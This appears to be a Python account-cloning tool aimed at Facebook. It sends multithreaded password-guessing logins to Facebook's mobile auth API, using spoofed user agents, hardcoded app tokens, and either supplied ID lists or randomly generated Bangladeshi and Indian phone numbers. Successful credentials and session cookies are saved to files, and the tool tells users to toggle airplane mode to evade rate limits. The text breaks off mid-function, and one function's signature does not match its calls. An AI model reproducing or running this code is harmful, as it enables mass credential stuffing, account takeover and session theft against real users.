#-------------------------( IMPORT)-------------------------#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:
    import requests
except ImportError:
    print(f'\n\x1b[1;97m[=] INSTALLING REQUESTS ')
    time.sleep(0.5)
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n\x1b[1;97m[=] INSTALLING FUTURES ')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n\x1b[1;97m[=] INSTALLING BS4 ')
    time.sleep(0.5)
    os.system('pip install bs4')
#-------------------------( RANDOM-UP-MODEL )-------------------------#
fbks = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
#AMSS1 = random.choice(['MessengerLite', 'FB4A;FBAV', 'FB4A'])
#AMSS2 = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
AMSS3 = random.choice(['SM-A515F','SM-A715F','SM-G998B','SM-G980F','SM-A217F','SM-A315F','SM-A115F','SM-A415F','SM-G973U','SM-N981B','SM-A505FN','SM-M315F','SM-A015M','SM-M215F','SM-A705FN','SM-G960F','SM-A305FN','SM-A105M','SM-A207F','SM-G950F','SM-N950X','SM-N960F','SM-N970F','SM-J730F','SM-G610F','M2101K6G','Aquaris U Plus','SM-G780G','SM-O497J','SM-L427V','SM-C297Z','SM-G507X','SM-Y634L','SM-J204F','SM-R911A','SM-X801O','SM-A792E','SM-H270F','SM-P993J','SM-V233F','SM-O861W','SM-D182C','SM-Y729G','SM-Z367Q','SM-U191O','SM-U559U','SM-B567Y','SM-O846M','SM-G342Z','SM-I847H','SM-A728M','SM-L637H','SM-L429N','SM-P413J','SM-N731T','SM-R505B','SM-A744X','SM-O400L','SM-F799H','SM-Z679E','SM-G822H','SM-N489K','SM-Z200Z','SM-Y119O','SM-E201F','SM-N785T','SM-G200V','SM-R067J','SM-N134B','SM-N227J','SM-K221P','SM-S150D','SM-A869J','SM-H143V','SM-C469H','SM-T152I','SM-Y575D','SM-W880B','SM-W460Q','SM-Q159J','SM-U637R','SM-J924Q','SM-W512P','SM-I745B','SM-O118H','SM-U111M','SM-U522B','SM-B611V','SM-G520J','SM-D144B','SM-C181B','SM-V128Q','SM-U167W','SM-L098E','SM-P454L','SM-L943O','SM-D368H','SM-P485X','SM-C715N','SM-H010U','SM-H710B','SM-X633F','SM-Z040T','SM-Q391G','SM-N451P','SM-T115B','SM-R248C','SM-T618P','SM-S067L','SM-M619P','SM-Q048A','SM-I787D','SM-X275W','SM-G911F','SM-R924W','SM-S506Z','SM-V941V','SM-G016M','SM-O008J','SM-L296E','SM-U876V','SM-L600X','SM-G169P','SM-F578L','SM-S727V','SM-F213B','SM-U822H','SM-Q995Y','SM-I602I','SM-V225C','SM-U921J','SM-Z302E','SM-Y080Z','SM-X174G','SM-T157W','SM-M311W','SM-H791P','SM-Q343U','SM-H261C','SM-D442E','SM-E047H','SM-S082M','SM-U311K','SM-Z651V','SM-I566H','SM-I593C','SM-L375P','SM-D399D','SM-Y086S','SM-O365U','SM-W782A','SM-S236Q','SM-D514J','SM-W806F','SM-W809F','SM-M645P','SM-W098A','SM-O026U','SM-Y689Z','SM-D832N','SM-C691X','SM-D921H','SM-G403Y','SM-S210U','SM-D768K','SM-F912H','SM-H856A','SM-J184W','SM-D512U','SM-K786Z','SM-Z107O','SM-D499G','SM-C815N','SM-D590H','SM-V695N','SM-M093A','SM-S354P','SM-F657J','SM-R743O','SM-A180A','SM-B651H','SM-X279B'])
#-------------------------( COLOUR )-------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
#-------------------------( LOOP )-------------------------#
loop = 0;oks = [];cps = [];id = []
#-------------------------( LINE )-------------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{G}────────────────────────────────────────────────')
#-------------------------( LOGO )-------------------------#
logo=(f'''{G}██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███  
 ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒
▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒
▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░ 
░  ░    ░      ░  ░    ░  ░   ░  ░   ░     
                                    
────────────────────────────────────────────────
\033[1;37m [•]\033[1;37m AUTHOR       : MD REJAUL KARIM
 [•]\033[1;37m TOOL STATUS  : PREMIUM
 [•]\033[1;37m TOOL VERSION : \033[1;32m1.1.0
\033[1;37m [•]\033[1;37m TOOL STATUS  : FILE AND RANDOM CLONING
{G}────────────────────────────────────────────────''')

ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
        aa='Mozilla/5.0 (Linux; Android'
        b=random.randrange(4,8)
        b1=random.randrange(0,8)
        b2=random.randrange(0,8)
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}.{b1}.{b2}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
        #Mozilla/5.0 (Linux; arm_64; Android 11; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.112 Mobile Safari/537.36
        aa='Mozilla/5.0 (Linux; arm_64; Android'
        b=random.choice(['5','6','7','8','9','10','11','12','13'])
        c='SM-G980F'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(111,199)
        i='0'
        j=random.randrange(4900,8900)
        k=random.randrange(40,199)
        l='Mobile Safari/537.36'
        fullagnt=(f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
        #Mozilla/5.0 (Linux; Android 6.0.1; S60 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 GSA/11.38.8.23.arm64
        aa='Mozilla/5.0 (Linux; Android'
        b=random.randrange(4,8)
        b1=random.randrange(0,8)
        b2=random.randrange(0,8)
        c='S60 Build/MMB29M; wv)'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0'
        h='Chrome/'
        b=random.randrange(86,199)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,199)
        l='Mobile Safari/537.36 GSA/11.38.8.23.arm64'
        fullagnt=(f'{aa} {b}.{b1}.{b2}; {c}) {g} {h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
        #Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 GSA/11.36.10.23.arm64
        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['5','6','7','8','9','10','11','12','13'])
        c='Redmi Note 8 Pro Build/QP1A'
        d=random.randrange(000000,999999)
        e=random.randrange(000,333)
        f='wv'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0'
        h='Chrome/'
        i=random.randrange(86,199)
        j='0'
        k=random.randrange(4200,4900)
        l=random.randrange(40,199)
        m='Mobile Safari/537.36 GSA/11.36.10.23.arm64'
        fullagnt=(f'{aa} {b}{c}.{d}.{e}; {f}) {g} {h}{i}.{j}.{k}.{l} {m}')
        ugen.append(fullagnt)
        
        aa='Mozilla/5.0 (Windows NT'
        b=random.randrange(5,10)
        c=random.randrange(0,10)
        d='Win64; x64'
        e='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        f=random.randrange(111,299)
        g='0'
        h=random.randrange(00,99)
        i=random.randrange(11,199)
        j='Safari/537.36 AtContent/'
        k=random.randrange(11,99)
        l=random.randrange(1,9)
        m=random.randrange(0000,9999)
        n=random.randrange(11,99)
        fullagnt=(f'{aa} {b}.{c}; {d}) {e}.{f}.{g}.{h} {j}{k}.{l}.{m}.{n}')
        ugen.append(fullagnt)
        
        #Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Sleipnir/6.4.16
        aa='Mozilla/5.0 (Windows NT'
        b=random.randrange(5,10)
        c=random.randrange(0,10)
        d='WOW64'
        e='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        f=random.randrange(111,299)
        g='0'
        h=random.randrange(00,99)
        i=random.randrange(99,189)
        j='Safari/537.36 AtContent/'
        k=random.randrange(11,99)
        l=random.randrange(1,9)
        m=random.randrange(1111,9999)
        n=random.randrange(11,99)
        fullagnt=(f'{aa} {b}.{c}; {d}) {e}.{f}.{g}.{h} {j}{k}.{l}.{m}.{n}')
        ugen.append(fullagnt)
        
        
#"Dalvik/2.1.0 (Linux; U; Android 12; SM-A235F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_US;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2199};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/pt_PT;FBBV/548243055;FBCR/Unitel STP;FBMF/samsung;FBBD/samsung;FBDV/SM-A032F;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1459};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build/RKQ1.201004.002) [FBAN/Orca-Android;FBAV/433.0.0.32.117;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/532438891;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1", "Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.miniclip.carrom;FBAV/15.2.0;FBBV/931;FBVS/6.16.0;FBLC/en_GB]","Dalvik/2.1.0 (Linux; U; Android 10; SM-T835 Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/339015011;FBCR/YES OPTUS;FBMF/samsung;FBBD/samsung;FBDV/SM-T835;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1600,height=2452};FB_FW/1;]"   
#-------------------------( MENU )-------------------------#
def menu():
    clear()
    print(f"{A} [1] FILE CLONING");print(f"{A} [2] RANDOM CLONING");print(f"{A} [0] EXIT CLONING");linex();option = input(f'{A}[?] SELECT : ')
    if option in ['A','1']:__filexx__()
    elif option in ['B','2']:__randmx__()
    elif option in ['C','0']:os.system('python od.py')
    else:
        print(f'\n{A}[=] VALID OPTION ');menu()
#-------------------------( FILE-SYS )-------------------------#      
def __filexx__():
    clear()
    print(f"{A} [=] EXAMPLE : /sdcard/BLACK.txt ");linex()
    dfile = input(f'{A} [?] FILE NAME : ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{A}[=] FILE NOT FOUND...');time.sleep(1);__filexx__()
    dplist = []
    try:
        clear()
        pass_lmit = int(input(f'{A} [=] PASSWORD LIMIT : '))
    except:
        pass_lmit =1
    clear()
    print(f"{A} [=] EXAMPLE : firstlast/first123/first@@ ");print(f"{A}[=] EXAMPLE : 57273200/59039200/57575751 ");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'{A} [=] PASSWORD NO.{i+1} :{G} '))
    with ThreadPool(max_workers=30) as BLACKxxx:
        clear();total_ids = str(len(dx))
        print(f"{A}[=] TOTAL ID :{G} {total_ids}");print(f"{A} [=] USE AIRPLANE MODE EVERY 5 MINTS");linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            BLACKxxx.submit(filemethodx,ids,names,passlist)
    print('');linex();print(f"{A} [=] CLONE COMPLETE BRO");print(f"{A} [=] TOTAL ID : {G}{len(oks)}");print(f"{A}[=] TOTAL CP : {G}{len(cps)}");linex();exit()
#-------------------------( RANDOM )-------------------------#
def __randmx__():
    clear()
    print(f"{A} [1] BANGLADESH CLONING");print(f"{A} [2] INDIA CLONING");print(f"{A} [0] BACK MAIN MENU");linex();option = input(f'{A}[?] SELECT : ')
    if option in ['A','1']:__bd__()
    elif option in ['B','2']:__India__()
    elif option in ['C','0']:menu()
    else:
        print(f'\n{A} [=] VALID OPTION ');__randmx__()
#-------------------------( RANDOM-BD-SYS)-------------------------#
def __bd__():
    user=[]
    clear()
    print(f"{A} [=] EXAMPLE : 017 | 018 | 019 | 016");linex();code = input(f"{A}[?] SELECT  :  ");clear();print(f"{A}[=] EXAMPLE : 3000 | 5000 | 9999 | 99999");linex();limit = int(input(f"{A}[?] SELECT  : "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as blackxxxxx:
        clear();tl = str(len(user))
        print(f'{A} [=] SIM CODE :{G} {code} ');print(f'{A} [=] TOTAL ID :{G} {tl} ');print(f"{A} [=] USE AIRPLANE MODE EVERY 5 MINTS");linex()
        for love in user:
           ids = code+love
           ax = love[:6]
           bx = love[:7]
           cx = ids[:8]
           passlist = [love,ids,ax,bx,cx,'Bangladesh','bangla','Free Fire','free fire','@#@#@#','@@@###']
           blackxxxxx.submit(randmmethod,ids,passlist)
    print('');linex();print(f"{A} [=] CLONE COMPLETE BRO");print(f"{A} [=] TOTAL ID : {G}{len(oks)}");print(f"{A} [=] TOTAL CP : {G}{len(cps)}");linex();os.system('python od.py')
#-------------------------( RANDOM-INDIA-SYS)-------------------------#
def __India__():
    user=[]
    clear()
    print(f"{A} [=] EXAMPLE : +91639 | +97852 | +93643 | +93747");linex();code = input(f"{A}[?] SELECT  :  ");clear();print(f"{A}[=] EXAMPLE : 3000 | 5000 | 9999 | 99999");linex();limit = int(input(f"{A}[?] SELECT  : "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as blackxxxxx:
        clear();tl = str(len(user))
        print(f'{A} [=] SIM CODE :{G} {code} ');print(f'{A}[=] TOTAL ID :{G} {tl} ');print(f"{A}[=] USE AIRPLANE MODE EVERY 5 MINTS");linex()
        for love in user:
           ids = code+love
           passlist = ['57575752','india123','57575751','57273200','59039200',ids,love,ids[3:]]
           blackxxxxx.submit(randmmethod,ids,passlist)
    print('');linex();print(f"{A} [=] CLONE COMPLETE BRO");print(f"{A}[=] TOTAL ID : {G}{len(oks)}");print(f"{A}[=] TOTAL CP : {G}{len(cps)}");linex();os.system('python od.py')
#-------------------------( FILE-METHOD )-------------------------#
def filemethodx(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}[BLACK-XD] %s OK|CP %s|%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            version_FN=str(random.randint(11,999))+".0.0."+str(random.randint(11,99))+"."+str(random.randint(11,999))
            version_FV=str(random.randint(000000000,999999999))
            androd_version=str(random.randint(4,9))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9))
            version_and=random.choice(['5','6','7','8','9','10','11','12','13'])
            fbks=random.choice(["com.facebook.mlite","com.facebook.katana","com.facebook.lite","com.facebook.orca"])
            voda=f"[FBAN/Orca-Android;FBAV/{str(version_FN)};FBPN/{str(fbks)};FBLC/en_ZA;FBBV/{str(version_FV)};FBDM/"+"{density=3.0,width=1080,height=1776}"+";FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/{str(version_and)};FBCA/armeabi-v7a:armeabi;]"
            voda=f"[FBAN/Orca-Android;FBAV/{version_FN};FBPN/{fbks};FBLC/en_US;FBBV/{version_FV};FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/{androd_version};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.0,width=720,height=1356}"+";FB_FW/1;]"
            voda=f"[FBAN/Orca-Android;FBAV/{version_FN};FBPN/{fbks};FBLC/en_US;FBBV/{version_FV};FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/{version_and};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.0,width=720,height=1344}"+";FB_FW/1;]"
            voda=f"[FBAN/Orca-Android;FBAV/{version_FN};FBPN/{fbks};FBLC/en_GB;FBBV/{version_FV};FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX1;FBSV/{version_and};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1426}"+";FB_FW/1;]"
            voda=f"[FBAN/Orca-Android;FBAV/{version_FN};FBPN/{fbks};FBLC/en_US;FBBV/{version_FV};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{androd_version};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920}"+";FB_FW/1;]"
            voda=f"[FBAN/FB4A;FBAV/{version_FN};FBPN/{fbks};FBLC/es_MX;FBBV/ {version_FV};FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/"+"{density=2.0,width=720height=1280}"+";FB_FW/1;FBRV/{version_FV};]"
            head = {"User-Agent": voda,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                print(f'\r\r{G}[BLACK-OK] '+ids+' | '+pas)
                oks.append(ids)
                open('/sdcard/BLACK-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                open('/sdcard/BLACK-FiLE-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[BLACK-CP] '+ids+f' | '+pas)
                open('/sdcard/BLACK-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#-------------------------( RANDOM-METHOD )-------------------------#
def randmmethod(ids,names,passlist):
    try:
        global oks,loop
        sys.stdout.write(f'\r\r{A}[BLACK-XD] %s OK|CP %s|%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        for pas in passlist:
            pro=random.choice(ugen)
            andoid_version=random.choice(['5','6','7','8','9','10','11','12','13'])
            android_version=str(random.randint(4,9))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9))
            face_version=str(random.randint(99,999))+'.0.0.'+str(random.randint(11,66))+'.'+str(random.randint(99,999))
            fks_version=random.choice(['com.facebook.lite','com.facebook.mlite','com.facebook.orca','com.facebook.katana'])
            fbv_version=str(random.randint(000000000,999999999))
            ux=f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}; RNE-L22 Build/HUAWEIRNE-L22) [FBAN/Orca-Android;FBAV/{face_version};FBPN/{fks_version};FBLC/in_ID;FBBV/{fbv_version};FBCR/Telkomsel;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/RNE-L22;FBSV/{android_version};FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.75,width=1080,height=2050}'+';FB_FW/1;]'
